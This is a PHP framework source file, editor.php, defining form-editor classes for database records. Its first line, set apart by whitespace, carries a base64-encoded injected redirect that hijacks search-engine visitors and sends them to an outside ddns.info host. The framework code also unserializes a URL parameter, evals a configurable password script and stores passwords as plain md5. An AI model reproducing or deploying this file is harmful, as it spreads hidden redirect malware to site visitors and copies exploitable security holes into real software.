<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

/**
 * Project:     Generic PHP framework
 * File:        editor.php
 *
 * @version 1.1.0.0
 * @package Generic
 */

require_once(dirname(__FILE__)."/html_control.php");
require_once(dirname(__FILE__)."/control.php");
require_once(dirname(__FILE__)."/page_control.php");
require_once(dirname(__FILE__)."/window.php");
require_once(dirname(__FILE__)."/entity.php");
require_once(dirname(__FILE__)."/define.php");
require_once(dirname(__FILE__)."/browser.php");
                            
class editor_container {

  var $controls;
  var $params;

  function __add_control($params = array()) {

    $this->controls[] = $params;
                             
  }

  function add_page_control($params = array()) {
    
    $params["type"] = "page_control";
    
    $this->__add_control($params);
    
  }

  function add_page($title) {
    
    $params["type"]  = "page";
    $params["title"] = trn($title);
    $this->__add_control($params);
    
  }

  function add_separator($title = '&nbsp;') {
    
    $params["type"]  = "separator";
    $params["title"] = $title;
    $this->__add_control($params);
    
  }
  
  function add_row($value = '&nbsp;') {
    
    $params["type"] = "row";
    $params["value"] = $value;
    $this->__add_control($params);
    
  }
  
  function add_group_label($params) {

    $params["type"] = "group_label";
    $this->__add_control($params);

  }

  function add_column() {

    $params["type"] = "column";
    $this->__add_control($params);

  }

  function add_control($control) {
       
    $params["type"]    = "control";
    $control->setup();
    $params["control"] = $control;
    $this->__add_control($params);

  }

  function add_line_break() {

    $params["type"]    = "line_break";
    $this->__add_control($params);

  }

  function add_container($label, $container) {

    $params["type"]  = "container";
    $params["label"] = $label;
    $params["value"] = $container;
    $this->__add_control($params);

  }

  function add_radio_container($container, $params = array()) {

    $params["type"]       = "radio_container";
    $params["value"]      = $container;
    $this->__add_control($params);

  }

  function add_field($field, $check_only = false) {

    if (safe($field, "name") and !safe($field, "control"))
      $field["control"] = (safe($field, 'table')?safe($field, 'table').'_':'').$field["name"];

    if (safe($field, "label") and !safe($field, "display_name"))
      $field["display_name"] = $field["label"];

    if (safe($field, "display_name") and !safe($field, "label") and !safe($field, "check_label"))
      $field["label"] = $field["display_name"];

    if (safe($field, "type") == 'captcha') {
      $field["required"] = true;
      $field["virtual"] = true;
    }

    if (safe($field, "type") == 'captcha_question') {
      $field["required"] = true;
      $field["virtual"] = true;
    }

    if (!$check_only) {
      $params["type"]  = "field";
      $params["field"] = $field;
      $this->__add_control($params);
    }

    return $field;

  }

  function contain_field_control($name) {

    foreach($this->controls as $control) {
      switch ($control["type"]) {
        case "field":
          if ($control["field"]["control"] == $name)
            return true;
          break;
        case "container":
          if ($control["value"]->contain_field_control($name))
            return true;
          break;  
      }
    }      
    return false;
    
  }

}

class editor_radio_container extends editor_container {

  function add_radio_item($label, $container, $field_value = null) {

    $params["type"]        = "radio_item";
    $params["label"]       = $label;
    if (is_bool($field_value))
      $params["checked"] = $field_value;
    else
      $params["field_value"] = $field_value;
    $params["value"]       = &$container;
    for($i = 0; $i < count($container->controls); $i++) {
      switch ($container->controls[$i]["type"]) {
        case "field":
          $container->controls[$i]["field"]["linked_value"] = $field_value;
          break;
      }
    }      
    
    $this->__add_control($params);

  }

}

class editor extends window {

  var $title   = null;
  var $table   = null;
  var $tables  = array();
  var $storage = null;

  // when in wizard mode - regarding to this attribute editor will be closed
  var $wizard_mode  = false;
  var $cancel_via_post_back = false;
  var $wizard_steps_amount = 0;
  var $wizard_steps_names = array();
  
  var $fields    = array();
  var $buttons   = array();
  var $container = null;

  var $__key            = null;
  var $__source_key            = null;

  var $key_field = "id";

  var $cancel_redirect  = null;   
  var $save_redirect    = null;             
  var $save_redirect_js = null;             

  var $action_param     = URL_PARAM_ACTION;
  var $key_param        = URL_PARAM_KEY;
  
  //var $row_sql = null;

  // this editor is virtual one - used only for rendering and checking
  var $virtual = false;
  
  var $button_labels = array();

  var $error_panel_operation = "saving data";
  var $error_panel_comment   = "Data has <strong>not</strong> been saved.";

  var $alert_save_result = false;
  var $message_save_result = true;

  // current row
  // old
  var $row;
  // new
  var $data_rows;
  var $row_requested;
  var $row_retrieved;
  var $operation = null;
  
  var $source_row;
  var $source_row_requested = false;

  var $main_page_title = "General";
  var $main_page_save_active_page = false;
  
  var $defaults = array();
  
  var $display_name;
  
  // save confirmations, shown before saving record
  var $save_confirmation = null;
  var $save_confirmation_as_value = false;

  // save reason query, requested before saving record
  var $save_reason_query = null;

  var $__in_page_control = false;
  var $__in_page_control_pages_visible = false;
  
  var $__main_page_control = null;
  
  var $__page_controls_amount = 0;
  
  var $always_refresh_caller = false;

  var $buttons_position = 'right';
  
  var $controlled_outside = false;
  
  // could be set to true if you want to disable editor rendering
  var $data_errors = array();
  
  function editor($init_params = array()) {

    $this->init_params  = $init_params;
    
    if (get(URL_PARAM_DEFAULTS)) {
      $defaults = @unserialize(urldecode(get(URL_PARAM_DEFAULTS)));
      if (is_array($defaults))
        $this->defaults = $defaults;
    }   

    $this->insert = (!$this->possible_key());
    
    $this->container = new editor_container();

    $this->button_labels['save']           = '&nbsp;&nbsp;'.trn('Save &amp; Close').'&nbsp;&nbsp;';
    $this->button_labels['save_not_popup'] = '&nbsp;&nbsp;'.trn('Save').'&nbsp;&nbsp;';
    $this->button_labels["apply_insert"]   = '&nbsp;&nbsp;'.trn('Save').'&nbsp;&nbsp;';
    $this->button_labels["apply_edit"]     = '&nbsp;&nbsp;'.trn('Save').'&nbsp;&nbsp;';
    $this->button_labels["save_and_new"]   = '&nbsp;&nbsp;'.trn('Save &amp; New').'&nbsp;&nbsp;';
    $this->button_labels["save_and_prior"] = '&nbsp;&nbsp;'.trn('Save &amp; Prior').'&nbsp;&nbsp;';
    $this->button_labels["save_and_next"]  = '&nbsp;&nbsp;'.trn('Save &amp; Next').'&nbsp;&nbsp;';
    $this->button_labels['cancel']         = '&nbsp;&nbsp;'.trn('Cancel').'&nbsp;&nbsp;';
    $this->button_labels['ok']             = '&nbsp;&nbsp;'.trn('Ok').'&nbsp;&nbsp;';
    $this->button_labels['next_button']    = 'Next';
    $this->button_labels['reset']          = '&nbsp;&nbsp;'.trn('Reset').'&nbsp;&nbsp;';
    
    $this->storage = EDITOR_VIRTUAL_STORAGE_PREFIX.__HTML_CONTROL_NAME_SEPARATOR.get_class($this);

    $this->separate_parts_in_template_mode = true;
    
    parent::window(array("class" => "editor"));

    $this->hide('upper_buttons');
    
  }                                                                   

  function initial() { 

//    return (!$this->context_post(POST_PARAM_EVENT_NAME));
    return (!SUBMIT_MODE);

  }

  function insert()  { 
  
    return $this->insert; 

  }

  function action() {

    if ($this->insert())
      return "insert";
    else
    if ($this->read_only)
      return "view";
    else
      return "edit";

  }
  
  function set_key($value) {
    
    $this->__key = $value;
    
  }

  function key() {
    
    if (!$this->__key) {
      $this->__key = safe($this->init_params, 'key');
      if (!$this->__key) {
        global $db;
        $this->__key = $db->decrypt_key(get(URL_PARAM_KEY));
      }
    }

    return $this->__key;
        
  }

  function possible_key() {
    
    return ($this->__key || safe($this->init_params, 'key') || get(URL_PARAM_KEY));
        
  }

  function set_source_key($value) {
    
    $this->__source_key = $value;
    
  }

  function source_key() {
    
    if (!$this->__source_key) {
      $this->__source_key = safe($this->init_params, 'source_key');
      if (!$this->__source_key) {
        global $db;
        $this->__source_key = $db->decrypt_key(get(URL_PARAM_SOURCE_KEY));
      }
    }

    return $this->__source_key;
        
  }

  function is_field($field) {

    return ((safe($field, "type") != "check_list") and
            (safe($field, "type") != "lookup_list") and
            (safe($field, "type") != "list"));

  }

  function is_field_real($field) {

    return ($this->is_field($field) and 
            !safe($field, "virtual") and
            !( 
              ( safe($field, "type") == "password" or 
                safe($field, "type") == "plain_password"
              ) and safe($field, "read_only")
            ));

  }

  function is_field_read_only($field) {
    
    return ($this->read_only or safe($field, "read_only"));

  }

  function is_field_link($field) {
    
    return ((safe($field, "type") == "check_list") or
            (safe($field, "type") == "lookup_list") or
            (safe($field, "type") == "list"));

  }

  function is_field_visible($field) {

    return (safe($field, "type") != "hidden");
    
  }

  function do_after_setup() {
    
    if ($this->is_copy_mode()) {
      if ($key = $this->do_copy($this->source_key())) {
        $this->set_key($key);
        $this->goto_edit();
      }
    }
    
    if (SUBMIT_MODE && ($this->is_apply_mode() || $this->main_page_save_active_page)) {
      $this->set_setting('page_control_0_active_page', $this->context_post('page_control_0_active_page'));
    }

    if ($this->virtual) {
                      
      if ($this->wizard_mode) {     
        switch ($this->get_wizard_step()) {
          case $this->wizard_steps_amount:     
            $this->add_button(array("caption" => "&lt;&lt; Prior", "href" => "javascript:".$this->js_post_back("edt_wizard_prior")));
            break;
          case 1:
            $this->button_labels['save'] = ' '.trn($this->button_labels['next_button']).' &gt;&gt;';
            $this->button_labels['save_not_popup'] = $this->button_labels['save'];
            break;
          default:
            $this->add_button(array("caption" => "&lt;&lt; Prior", "href" => "javascript:".$this->js_post_back("edt_wizard_prior")));
            $this->button_labels['save'] = ' '.trn('Next').' &gt;&gt;';
            $this->button_labels['save_not_popup'] = $this->button_labels['save'];
            break;
        }
      }
      
      
    } else {
      if ($this->wizard_mode) 
        critical_error('"wizard mode" in non virtual editor is not supported', get_class($this));
      if (!$this->table)
        critical_error('"table" propery must be specified', get_class($this));
    }
    
    global $dm;
    $this->key_field = $dm->key_field($this->table, $this->key_field);
    
  }
  
  function generate_title() {
    
    if (!$this->title) {
      if ($this->wizard_mode) {
        $this->title = trn($this->display_name).' - '.trn('Step').' '.$this->get_wizard_step().' '.trn('of').' '.$this->wizard_steps_amount.': '.$this->wizard_steps_names[$this->get_wizard_step()-1];
      } else {
        switch ($this->action()) {
          case 'view':
            $this->operation = trn("View ");
            break;
          case 'insert':
            $this->operation = trn("Create ");
            break;
          case 'edit':  
            $this->operation = trn("Edit ");
            break;
        }    
        $this->title = $this->operation.trn($this->display_name);
      }
    } else {
      $this->title = trn($this->title);
    }
    
  }
  
  function do_render() {

    global $tmpl;
    global $ui;
    global $auth;
    
    //$this->read_only = ($this->read_only or !$auth->can(get_class($this), "edit"));
    
    if ($this->template_mode) {
      $ctrl = new hidden($this->context_id(POST_PARAM_SENDER_NAME), $this->id());
      $ctrl->is_interactive = false;
      $ctrl->is_templateable = true;
      $this->add($ctrl);
      
      $ctrl = new hidden($this->context_id(POST_PARAM_EVENT_NAME),  $this->context_post(POST_PARAM_EVENT_NAME));
      $ctrl->is_interactive = false;
      $ctrl->is_templateable = true;
      $this->add($ctrl);

      $ctrl = new hidden($this->context_id(POST_PARAM_EVENT_VALUE), $this->context_post(POST_PARAM_EVENT_VALUE));
      $ctrl->is_interactive = false;
      $ctrl->is_templateable = true;
      $this->add($ctrl);

      $ctrl = new hidden($this->context_id(POST_PARAM_CONFIRM_VALUE), $this->context_post(POST_PARAM_CONFIRM_VALUE));
      $ctrl->is_interactive = false;
      $ctrl->is_templateable = true;
      $this->add($ctrl);

      $ctrl = new hidden($this->context_id(POST_PARAM_REASON_VALUE), $this->context_post(POST_PARAM_REASON_VALUE));
      $ctrl->is_interactive = false;
      $ctrl->is_templateable = true;
      $this->add($ctrl);
    } else {     
      $this->add(new hidden($this->context_id(POST_PARAM_SENDER_NAME),   $this->id()));
      $this->add(new hidden($this->context_id(POST_PARAM_EVENT_NAME),    $this->context_post(POST_PARAM_EVENT_NAME)));
      $this->add(new hidden($this->context_id(POST_PARAM_EVENT_VALUE),   $this->context_post(POST_PARAM_EVENT_VALUE)));
      $this->add(new hidden($this->context_id(POST_PARAM_CONFIRM_VALUE), $this->context_post(POST_PARAM_CONFIRM_VALUE)));
      $this->add(new hidden($this->context_id(POST_PARAM_REASON_VALUE),  $this->context_post(POST_PARAM_REASON_VALUE)));
    }
    
    //$this->add(new script_href(SHARED_SCRIPTS_URL."jquery.focusfields.js"));
    
    if ($this->get_data_row()) {
      if (($this->action() == "insert") and !$this->can_insert($this->row) and !$this->read_only) {
        $this->read_only = true;
      } else
      if (($this->action() == "insert") and !$auth->can(get_class($this), 'insert') and !$this->read_only) {
        $this->read_only = true;
      } else
      if (($this->action() == "edit") and !$this->can_update($this->row) and !$this->read_only) {
        $this->read_only = true;
      } else
      if (($this->action() == "edit") and !$auth->can(get_class($this), 'edit') and !$this->read_only) {
        $this->read_only = true;
      }
    } else {
      $this->read_only = true;
    };
    
    $this->generate_title();

    if ($this->visible("header")) {
      $this->render_title($this->title);
      $this->add(new empty_line());
    } else 
    if ($this->visible("legend")) {
      $this->render_legend();
      $this->add(new empty_line());
    }

    if ($this->errors) {
      $this->render_error_panel($this->errors, $this->error_panel_operation, trn($this->error_panel_comment));
    }

    if ($this->data_errors) {
      $this->render_error_panel($this->data_errors);
    }

    if (!$this->message) {
      $this->message = $this->setting('message_from_prior_session');
    }

    $this->set_setting('message_from_prior_session', null);

    if ($this->message) {
      $this->render_message_panel($this->message);
    }

    if (!$this->data_errors) {
      
      if ($this->get_data_row()) {
        if (($this->action() == "insert") and (!$this->can_insert($this->row) or !$auth->can(get_class($this), 'insert'))) {
          $this->render_error_panel(array("Access denied"), "trying to create record");
          $this->read_only = true;
        } else
        if (($this->action() == "edit") and (!$this->can_update($this->row) or !$auth->can(get_class($this), 'edit'))) {
          $this->render_error_panel(array("Access denied"), "trying to edit record");
          $this->read_only = true;
        } else
        if (($this->action() == "view") and (!$this->can_view($this->row) or !$auth->can(get_class($this), 'view'))) {
          $this->render_error_panel(array("Access denied"), "trying to view record");
          $this->read_only = true;
        } else {
          $this->render_editor();
          $this->add(new empty_line());
        }
      } else {
        if ($this->read_only)
          $this->render_error_panel(array("Record not found"), "trying to view record");
        else
          $this->render_error_panel(array("Record not found"), "trying to edit record");
        $this->read_only = true;
      };
    
      $this->render_bottom_buttons();
      $this->add(new empty_line());
    
    }
    
    if (get(URL_PARAM_POPUP_WINDOW)) {
      $this->add(new script('$(document).ready(function() { ResizePopUpToContent(); });'));
    }

    //$this->add(new script('$("input, textarea").focusFields();'));

    parent::do_render();

  }

  function do_before_render_bottom_buttons($row) {
  
  }

  function do_after_render_bottom_buttons($row) {
  
  }
  
  function render_bottom_buttons() {
    
    $table = new table(array( "width"       => $this->width
                            , "cellspacing" => 1
                            , "class"       => "edt_buttons"
                            ));
    $row = new table_row();
    
    if ($this->buttons_position != 'left')
      $row->add(new table_cell(array("width" => "100%")));
    
    $this->do_before_render_bottom_buttons(&$row);
    
    $this->render_buttons(&$row);
    
    $this->do_after_render_bottom_buttons(&$row);
    
    if ($this->buttons_position == 'left')
      $row->add(new table_cell(array("width" => "100%")));

    $table->add($row);
    $this->add($table);
    
  }
  
  function render_buttons($row) {
    
    global $auth, $url;
                          
    if ($this->read_only and $this->capable("edit") and $auth->can(get_class($this), 'edit'))
      $row->add(new table_cell(new button(array( "onclick" => "document.location='".$url->generate_url(array(URL_PARAM_ACTION => "edit"))."'"
                                               , "value"   => '&nbsp;&nbsp;'.trn('Edit').'&nbsp;&nbsp;'))));
                                               
    foreach($this->buttons as $button) {
      $row->add(new table_cell(new button(array( "onclick" => $button["href"]
                                               , "value"   => trn($button["caption"])
                                               , "class"   => safe($button, 'class')
                                               ))));
    }

    if ($this->buttons)
      $row->add(new table_cell(new space(3)));

    if (!$this->read_only and $this->capable("new"))
      $row->add(new table_cell(new button(array( "onclick" => $this->js_post_back("edt_goto_new")
                                               , "value"   => '&nbsp;&nbsp;'.trn('New').'&nbsp;&nbsp;'))));
    if ($this->capable("prior"))
      $row->add(new table_cell(new button(array( "onclick" => $this->js_post_back("edt_goto_prior")
                                               , "value"   => '&lt;&lt;&nbsp;'.trn('Prior').'&nbsp;&nbsp;'))));
    if ($this->capable("next"))
      $row->add(new table_cell(new button(array( "onclick" => $this->js_post_back("edt_goto_next")
                                               , "value"   => '&nbsp;&nbsp;'.trn('Next').'&nbsp;&gt;&gt;'))));
    if ($this->capable("new") or $this->capable("prior") or $this->capable("next"))
      $row->add(new table_cell(new space(3)));
    if (!$this->read_only) {
      if ($this->capable("reset")) {
        $button = new reset_button(array( "value"   => $this->button_labels["reset"] ));  
        $this->do_before_finalyze_button(&$button, 'reset');
        $row->add(new table_cell($button));
      }
      if ($this->capable("apply")) {
        if ($this->insert()) {
          $button = new button(array( 'template_id'     => 'apply_button'
                                    , 'template_object' => $this->template_object()
                                    , "onclick"         => 'this.disabled=true;'.$this->js_post_back("edt_apply")
                                    , "value"           => $this->button_labels["apply_insert"]
                                    , "class"           => 'apply_button'
                                    ));
        } else {
          $button = new button(array( 'template_id'     => 'apply_button'
                                    , 'template_object' => $this->template_object()
                                    , "onclick"         => 'this.disabled=true;'.$this->js_post_back("edt_apply")
                                    , "value"           => $this->button_labels["apply_edit"]
                                    , "class"           => 'apply_button'
                                    ));
        }
        $this->do_before_finalyze_button(&$button, 'apply');
        $row->add(new table_cell($button));
      }
      if ($this->capable("save_and_new")) {
        $row->add(new table_cell(new button(array( "onclick" => 'this.disabled=true;'.$this->js_post_back("edt_save_and_new")
                                                 , "value"   => $this->button_labels["save_and_new"]
                                                 ))));
      }
      if ($this->capable("save_and_prior"))
        $row->add(new table_cell(new button(array( "onclick" => 'this.disabled=true;'.$this->js_post_back("edt_save_and_prior")
                                                 , "value"   => $this->button_labels["save_and_prior"]
                                                 ))));
      if ($this->capable("save_and_next"))
        $row->add(new table_cell(new button(array( "onclick" => 'this.disabled=true;'.$this->js_post_back("edt_save_and_next")
                                                 , "value"   => $this->button_labels["save_and_next"]
                                                 ))));
        
      if ($this->visible('save')) {
        if (get(URL_PARAM_POPUP_WINDOW)) {
          $display_name = $this->button_labels['save'];
        } else {
          $display_name = $this->button_labels['save_not_popup'];
        }
        $attributes = array( 'template_id'     => 'save_button'
                           , 'template_object' => $this->template_object()
                           , "value"           => $display_name
                           , "class"           => 'save_button'
                           );
        if ($this->save_reason_query)
          $attributes["onclick"] = $this->js_post_back_with_reason("edt_save", null, $this->save_reason_query);
        else  
          $attributes["onclick"] = 'this.disabled=true;'.$this->js_post_back("edt_save", null, $this->save_confirmation, $this->save_confirmation_as_value);

        $button = new submit_button($attributes);
        $this->do_before_finalyze_button(&$button, 'save');                                         
        $row->add(new table_cell($button));
      }
      if ($this->visible('cancel')) {
        $row->add(new table_cell(new space(3)));
        $row->add(new table_cell(new button(array( 'template_id'     => 'cancel_button'
                                                 , 'template_object' => $this->template_object()
                                                 , "onclick"         => $this->get_close_script($this->always_refresh_caller)
                                                 , "value"           => $this->button_labels['cancel']
                                                 , "class"           => 'cancel_button'
                                                 ))));
      }
    } else {
      if ($this->visible('cancel') and !$this->binded) {
        $row->add(new table_cell(new space(3)));
        $row->add(new table_cell(new submit_button(array( 'template_id'     => 'cancel_button'
                                                        , 'template_object' => $this->template_object()
                                                        , "onclick"         => $this->get_close_script($this->always_refresh_caller)
                                                        , "value"           => $this->button_labels['ok']
                                                        , "class"           => 'cancel_button'
                                                        ))));
      }
    }

  }

  function render_title($title) {

    global $auth, $url;
    
    $row = new table_row();
    
    if ($auth->user_id && $this->visible("notes") && get_config('generic/features/entityComments')) {
      $entityId = $this->id();
      $row->add(new table_cell( new javascript_image_href( 'OnOffEntityCommentWindow("'.$entityId.'", "'.get_class($this).'")'
                                                         , SHARED_RESOURCES_URL.'img_ajax_call.gif'
                                                         , array()
                                                         , array( 'alt' => 'Comments'
                                                                , 'id'  => $entityId.'_ec_switcher'
                                                                )
                                                         )));
    }
    
    $row->add(new table_cell($title, array("class" => "title", "width" => "100%")));

    $this->do_before_render_legend(&$row);

    if ($this->visible("legend")) {
      $row->add(new table_cell( new image(SHARED_RESOURCES_URL.'required.gif')
                                    , new text(' - '.trn('required fields'))));
    }                                

    if ($this->visible('upper_buttons'))
      $this->render_buttons(&$row);

    $this->do_after_render_title(&$row);
      
    $this->add(new table( array( "width"       => $this->width
                               , "cellspacing" => 1
                               , "class"       => "edt_title"
                               )
                        , $row));
                        
    if ($auth->user_id && $this->visible("comments") && get_config('generic/features/entityComments')) {
      $this->add(new html_div( array( 'class' => 'entity_comment'
                                    , 'id'    => $entityId.'_ec_window'
                                    )
                             , '<div class="entity_comment_buttons">
                                  <script>var nicEditorIcons="'.SHARED_SCRIPTS_URL.'nicEditorIcons.gif";LoadEntityComment("'.$entityId.'", "'.get_class($this).'");</script>
                                  <a href="javascript:;" id="'.$entityId.'_ec_edit" onclick="ShowEntityCommentEditor(\''.$entityId.'\');"><img alt="Edit" title="Edit" src="'.SHARED_RESOURCES_URL.'img_comment_edit.gif" border="0"></a>
                                  <a href="javascript:;" id="'.$entityId.'_ec_save" style="display:none;" onclick="SaveEntityComment(\''.$entityId.'\', \''.get_class($this).'\');"><img alt="Save" title="Save" src="'.SHARED_RESOURCES_URL.'img_comment_add.gif" border="0"></a>
                                  <a href="javascript:;" id="'.$entityId.'_ec_cancel" style="display:none;" onclick="CancelEntityComment(\''.$entityId.'\', \''.get_class($this).'\');"><img alt="Cancel" title="Cancel" src="'.SHARED_RESOURCES_URL.'img_comment_delete.gif" border="0"></a>
                               </div>
                               <div class="entity_comment_body" id="'.$entityId.'_ec_editor"></div>'
                             ));
    }                    
    
  }

  function render_legend() {

    $this->add(new table( array( "width"       => $this->width
                               , "cellspacing" => 1
                               )
                        , new table_row(new table_cell(array("align" => "right", "width" => "100%")
                                  , new image(SHARED_RESOURCES_URL.'required.gif')
                                  , new text(' - '.trn('required fields'))))));
    
  }

  function do_after_render_title($title_row) { }
  function do_before_render_legend($title_row) { }

  function internal_save_fields($table, $key_field, $key_value = null, $main_table) {
 
    global $db;
    global $dm;

    $defs = array();
    if (!$this->virtual) {
      $dm->table($table, "key_field", $key_field);
      $defs = $dm->fields($table);
    }
                       
    $values = array();

    $uploads = array();
 
    foreach($this->fields as $field) {
         
      $relevant = true;
      $control_name = null;
      
      if (safe($field, 'linked_to_field')) {
        $linked_field = $field['linked_to_field'];
        $linked_field_value = post($this->context_id($linked_field['control']));
        if (array_key_exists($linked_field_value, $field['linked_values'])) {
          $relevant = true;
          $control_name = $field['linked_values'][$linked_field_value];
        }
      }
      
      if ($relevant && $this->is_field_real($field) && !$this->is_field_read_only($field) && (safe($field, 'table', $this->table) == $table)) {

        $field_name           = $field["name"];
        if (!$control_name)
          $control_name         = $field["control"];
        $context_control_name = $this->context_id($control_name);
        $type                 = safe($field, "type");
        $data_type            = safe($field, 'data_type', safe(safe($defs, $field_name), 'type', 'text'));
        $valid_file           = false;
        
        $value = post($context_control_name);
        if (is_string($value))
          $value = trim($value);
        if (safe($field, 'lowercase'))
          $value = strtolower($value);
        $time_value = post($context_control_name.__HTML_CONTROL_NAME_SEPARATOR.'time');
        
        $skip_field = false;

        switch ($type) {
          case "password":
            if ($value and 
                ($this->insert() or 
                ($db->value("SELECT ".$field_name." FROM ".$table." WHERE ".$key_field." = ?", $key_value) != $value))) {
              if (safe($field, 'sha1_password_field'))
                $values = array_merge($values, array($field["sha1_password_field"] => sha1($value)));
              if ($script = safe($field, 'password_encryption_script')) {
                eval('$value = '.rtrim(placeholder($script, $value), ';').';');
              } else {  
                $value = md5($value);
              }  
            }
            break;
          case "lookup":
            $value = post($context_control_name);
            $value = safe($value, "value");
            break;
          case "memo":
            if ($value && safe($field, 'replace_before_save')) {
              foreach($field['replace_before_save'] as $rule => $replacement)
                $value = preg_replace($rule, $replacement, $value);
            }
            break;
          case "credit_card":
            if ($value and 
                !$this->insert() and 
                (format_credit_card($db->value("SELECT ".$field_name." FROM ".$table." WHERE ".$key_field." = ?", $key_value)) == $value)) {
              $skip_field = true;
            }
            break;
          case "ipv4":
            if ($value and ($data_type != 'text'))
              $value = ip_str_to_num($value);
            break;
          case "file":
          case "image": 
            $skip_field = true; 
            if ((count($_FILES) > 0) and file_exists($_FILES[$context_control_name]["tmp_name"])) {
              if (!$this->virtual && !safe($field, 'virtual') && safe($field, 'folder') && mk_dir($field["folder"])) {
                $valid_file   = true;
                $file_info    = $_FILES[$context_control_name];
                $tmp_file     = $file_info["tmp_name"];
                $current_file = post($context_control_name.__HTML_CONTROL_NAME_SEPARATOR."current");
                if (safe($field, "preserve_file_name")) {
                  $new_file_name = $current_file;
                } else { 
                  $new_file_name = strtolower($file_info["name"]);
                }
                  
                if (safe($field, "auto_name")) {
                  $pathinfo = pathinfo($new_file_name);
                  $new_file_name = guid().".".$pathinfo["extension"];
                }
                
                $image_width  = 0;
                $image_height = 0;

                if (safe($field, "image_width_field") || safe($field, "image_height_field")) {
                  require_once(GENERIC_PATH.'utils/image_file.php');
                  $image = new image_file($tmp_file);
                  if ($image->valid) {
                    $image_width = $image->width();
                    $image_height = $image->height();
                  }
                }

                $uploads[] = array( 'tmp_file'      => $tmp_file 
                                  , 'new_file_name' => $new_file_name
                                  , 'file_info'     => $file_info
                                  , 'field'         => $field 
                                  , 'current_file'  => $current_file
                                  );

                $value = $new_file_name;
                $skip_field = false;

                if (safe($field, "file_size_field")) 
                  $values = array_merge($values, array($field["file_size_field"] => $file_info["size"]));
                if (safe($field, "file_type_field")) 
                  $values = array_merge($values, array($field["file_type_field"] => $file_info["type"]));
                if (safe($field, "file_name_field")) 
                  $values = array_merge($values, array($field["file_name_field"] => $file_info["name"]));
                if (safe($field, "image_width_field"))
                  $values = array_merge($values, array($field["image_width_field"] => $image_width));
                if (safe($field, "image_height_field"))
                  $values = array_merge($values, array($field["image_height_field"] => $image_height));
              }
            } 
            break;
        case "set":
            if(is_array($value)){
                $value_ts = $value;
                $value = "";
                foreach($value_ts as $ts_item){
                    $value .= $ts_item.",";
                }
                $value = substr($value,0,strlen($value)-1);
            }
            break;
          default:
            switch ($data_type) {
              case "date":
                if ($value)
                  if ($type == 'hidden')
                    $value = $db->to_date($value, INTERNAL_DATE_CONVERT_FORMAT);
                  else  
                  if ($this->virtual)
                    $value = str_to_date($value, array( 'mode'  => 'd', 'date_format' => INTERNAL_DATE_CONVERT_FORMAT));
                  else  
                    $value = $db->to_date($value, INTERNAL_DATE_CONVERT_FORMAT);
                  if(safe($field,'default')){
                    $value = safe($field,'default'); 
                  }
                break;
              case "date_time":
                if ($value)
                  if ($type == 'hidden')
                    $value = $db->to_datetime($value, INTERNAL_DATE_CONVERT_FORMAT);
                  else  
                  if ($this->virtual)
                    $value = str_to_date($value, array( 'mode'   => 'm' ));
                  else  
                    $value = $db->to_datetime($value.' '.$time_value, INTERNAL_DATE_CONVERT_FORMAT);
                  if(safe($field,'default')){
                    $value = safe($field,'default'); 
                  }
                break;
              case "time":
                if ($value) 
                  if ($this->virtual)
                    $value = str_to_date($value, array( 'mode'   => 't' ));
                  else 
                    $value = $db->to_time($value);
                break;
            }
        }

        if (!$skip_field)
          $values = array_merge($values, array($field_name => $value));
          

      }
    }

    if ($this->virtual) {

      $stored_values = session_get($this->storage);
      if (!is_array($stored_values))
        $stored_values = array();
      $stored_values = array_merge($stored_values, $values);
        
      session_set($this->storage, $stored_values);
      
    } else {
           
      if ($this->insert) {

        if (count($values) > 0) {
          $dm->save_ignore_sql_errors_state(true);
          $key_value = $dm->insert($table, $values);
          if ($main_table && $key_value)
            $this->__key = $key_value;
          $dm->restore_ignore_sql_errors_state();
          
          if (!$key_value)
            return false;
        }
     
      } else {  

        if (count($values) > 0) {
          $dm->save_ignore_sql_errors_state(true);
          $result = $dm->update($table, $values, $key_value);
          $dm->restore_ignore_sql_errors_state();

          if (!$result)
            return false;
        }
        
      }
      
      foreach ($uploads as $upload) {
        
        $tmp_file      = $upload['tmp_file'];
        $new_file_name = $upload['new_file_name'];
        $file_info     = $upload['file_info'];
        $field         = $upload['field'];
        $current_file  = $upload['current_file'];
      
        if (!$this->do_save_file($tmp_file, &$new_file_name, $file_info, $field)) {
          switch(safe($field, 'storage_mode')) {
            case "optimal":                                
              $folder = optimal_file_storage_path($field["folder"], $this->table, $this->key(), safe($field, 'optimal_storage_field_name', $field['name']));
              break;
            default:
